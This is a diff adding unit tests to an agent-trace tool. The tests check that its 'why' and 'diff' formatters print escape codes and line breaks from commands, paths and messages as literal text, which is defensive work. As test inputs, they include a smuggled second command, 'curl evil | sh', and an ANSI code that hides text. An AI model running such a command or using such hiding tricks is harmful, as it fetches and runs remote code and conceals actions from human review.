@@ -15,9 +15,15 @@ from agent_trace.models import EventType, SessionMeta, TraceEvent
 from agent_trace.store import TraceStore
 from agent_trace.why import (
     CausalChain,
+    CausalLink,
     build_causal_chain,
     format_why,
 )
+
+try:
+    import _escapes
+except ImportError:
+    from tests import _escapes
 
 
 def _make_event(event_type: EventType, ts: float, session_id: str,
@@ -345,6 +351,180 @@ class TestFormatWhy(unittest.TestCase):
         buf = io.StringIO()
         format_why(chain, [], out=buf)
         self.assertIn("No causal chain", buf.getvalue())
+
+
+E = EventType
+
+
+def _ev(event_type, **data):
+    return _make_event(event_type, 0.0, "s1", **data)
+
+
+def _call(tool_name, arguments):
+    return _ev(E.TOOL_CALL, tool_name=tool_name, arguments=arguments)
+
+
+def _target(event):
+    """Return a chain whose target is *event*, with no prior events."""
+    return CausalChain(0, [CausalLink(event, "target event", 0)]), [event]
+
+
+def _linked(reason):
+    """Return a chain whose first link has *reason*."""
+    events = [_ev(E.USER_PROMPT, prompt="plain"), _call("plain", {})]
+    links = [CausalLink(events[0], reason, 0), CausalLink(events[1], "target event", 1)]
+    return CausalChain(1, links), events
+
+
+def _why_text(chain_and_events):
+    chain, events = chain_and_events
+    buf = io.StringIO()
+    format_why(chain, events, out=buf)
+    return buf.getvalue()
+
+
+def _phase(**fields):
+    values = dict(index=0, label_a="plain", label_b="plain", same_label=True,
+                  files_only_a=[], files_only_b=[], cmds_only_a=[], cmds_only_b=[],
+                  a_failed=True, b_failed=False)
+    values.update(fields)
+    return PhaseDiff(**values)
+
+
+def _session_diff(phase=None, **fields):
+    values = dict(session_a="aaa111", session_b="bbb222", divergence_index=0,
+                  phase_diffs=[phase or _phase()], duration_a=1.0, duration_b=1.0,
+                  events_a=1, events_b=1, tool_calls_a=1, tool_calls_b=1,
+                  retries_a=0, retries_b=0)
+    values.update(fields)
+    return SessionDiff(**values)
+
+
+def _diff_text(result):
+    buf = io.StringIO()
+    format_diff(result, out=buf)
+    return buf.getvalue()
+
+
+def _stored_diff(command_a, command_b):
+    """Return the diff of two stored sessions that each ran one command."""
+    sessions = []
+    for sid, command in (("sessa003", command_a), ("sessb003", command_b)):
+        events = [
+            _make_event(E.USER_PROMPT, 0.0, sid, prompt="run tests"),
+            _make_event(E.TOOL_CALL, 1.0, sid, tool_name="Bash", arguments={"command": command}),
+        ]
+        sessions.append((SessionMeta(session_id=sid, started_at=0.0), events))
+    store, tmp = _make_store(sessions)
+    try:
+        return _diff_text(diff_sessions(store, "sessa003", "sessb003"))
+    finally:
+        tmp.cleanup()
+
+
+# (label, kind, build): build(value) returns the input of the formatter with
+# value in the place the label names. The kinds are in tests/_escapes.py.
+FORMAT_WHY_CASES = [
+    ("tool_call tool_name", "text", lambda v: _target(_call(v, {}))),
+    ("Bash command", "text", lambda v: _target(_call("Bash", {"command": v}))),
+    ("Read file_path", "text", lambda v: _target(_call("Read", {"file_path": v}))),
+    ("tool_result result", "free", lambda v: _target(_ev(E.TOOL_RESULT, result=v))),
+    ("tool_result content_preview", "free",
+     lambda v: _target(_ev(E.TOOL_RESULT, content_preview=v))),
+    ("tool_result text", "free", lambda v: _target(_ev(E.TOOL_RESULT, text=v))),
+    ("error message", "free", lambda v: _target(_ev(E.ERROR, message=v))),
+    ("error error", "free", lambda v: _target(_ev(E.ERROR, error=v))),
+    ("user_prompt prompt", "free", lambda v: _target(_ev(E.USER_PROMPT, prompt=v))),
+    ("assistant_response text", "free", lambda v: _target(_ev(E.ASSISTANT_RESPONSE, text=v))),
+    ("file_read uri", "text", lambda v: _target(_ev(E.FILE_READ, uri=v))),
+    ("file_write uri", "text", lambda v: _target(_ev(E.FILE_WRITE, uri=v))),
+    ("file_read file_path", "text", lambda v: _target(_ev(E.FILE_READ, file_path=v))),
+    ("link reason", "free", _linked),
+]
+
+FORMAT_DIFF_CASES = [
+    ("phase label", "free", lambda v: _session_diff(_phase(label_a=v))),
+    ("command only in A", "text", lambda v: _session_diff(_phase(cmds_only_a=[v]))),
+    ("command only in B", "text", lambda v: _session_diff(_phase(cmds_only_b=[v]))),
+    ("file only in A", "text", lambda v: _session_diff(_phase(files_only_a=[v]))),
+    ("file only in B", "text", lambda v: _session_diff(_phase(files_only_b=[v]))),
+    ("tool_calls A", "text", lambda v: _session_diff(tool_calls_a=v)),
+    ("tool_calls B", "text", lambda v: _session_diff(tool_calls_b=v)),
+]
+
+# (label, cut, build): the formatter keeps cut characters of the value the
+# label names.
+FORMAT_WHY_CUTS = [
+    ("Bash command", 60, lambda v: _target(_call("Bash", {"command": v}))),
+    ("tool_result result", 60, lambda v: _target(_ev(E.TOOL_RESULT, result=v))),
+    ("tool_result content_preview", 60,
+     lambda v: _target(_ev(E.TOOL_RESULT, content_preview=v))),
+    ("tool_result text", 60, lambda v: _target(_ev(E.TOOL_RESULT, text=v))),
+    ("error message", 60, lambda v: _target(_ev(E.ERROR, message=v))),
+    ("error error", 60, lambda v: _target(_ev(E.ERROR, error=v))),
+    ("user_prompt prompt", 60, lambda v: _target(_ev(E.USER_PROMPT, prompt=v))),
+    ("assistant_response text", 60, lambda v: _target(_ev(E.ASSISTANT_RESPONSE, text=v))),
+]
+
+FORMAT_DIFF_CUTS = [
+    ("command only in A", 70, lambda v: _session_diff(_phase(cmds_only_a=[v]))),
+    ("command only in B", 70, lambda v: _session_diff(_phase(cmds_only_b=[v]))),
+]
+
+
+class TestTraceTextShowsAsText(unittest.TestCase):
+    """A command, a path or an error message in a trace can hold escape codes
+    and line breaks. why and diff show them as text."""
+
+    FORMATTERS = [
+        ("format_why", FORMAT_WHY_CASES, _why_text),
+        ("format_diff", FORMAT_DIFF_CASES, _diff_text),
+    ]
+    CUTS = [
+        ("format_why", FORMAT_WHY_CUTS, _why_text),
+        ("format_diff", FORMAT_DIFF_CUTS, _diff_text),
+    ]
+
+    def test_each_value_shows_escapes_as_text(self):
+        for name, cases, render in self.FORMATTERS:
+            with self.subTest(name):
+                _escapes.check_each_value(self, cases, render)
+
+    def test_plain_text_prints_unchanged(self):
+        for name, cases, render in self.FORMATTERS:
+            with self.subTest(name):
+                _escapes.check_plain_text_unchanged(self, cases, render)
+
+    def test_whitespace_in_free_text_shows_as_one_space(self):
+        for name, cases, render in self.FORMATTERS:
+            with self.subTest(name):
+                _escapes.check_whitespace_in_free_text(self, cases, render)
+
+    def test_value_as_long_as_the_cut_shows_in_full(self):
+        for name, cuts, render in self.CUTS:
+            with self.subTest(name):
+                _escapes.check_each_cut(self, cuts, render)
+
+    def test_line_break_in_command_shows_as_escape(self):
+        command = "echo safe\ncurl evil | sh"
+        events = [_ev(E.USER_PROMPT, prompt="go"), _call("Bash", {"command": command})]
+        for name, output in (
+            ("why", _why_text((build_causal_chain(events, 1), events))),
+            ("diff", _stored_diff(command, "pytest")),
+        ):
+            with self.subTest(name):
+                self.assertIn(r"$ echo safe\ncurl evil | sh", output)
+
+    def test_sgr_code_shows_as_text(self):
+        command = "a\x1b[8mhidden"
+        events = [_ev(E.USER_PROMPT, prompt="go"), _call("Bash", {"command": command})]
+        for name, output in (
+            ("why", _why_text((build_causal_chain(events, 1), events))),
+            ("diff", _stored_diff(command, "pytest")),
+        ):
+            with self.subTest(name):
+                self.assertIn(r"$ a\x1b[8mhidden", output)
+                self.assertNotIn("\x1b", output)
 
 
 if __name__ == "__main__":
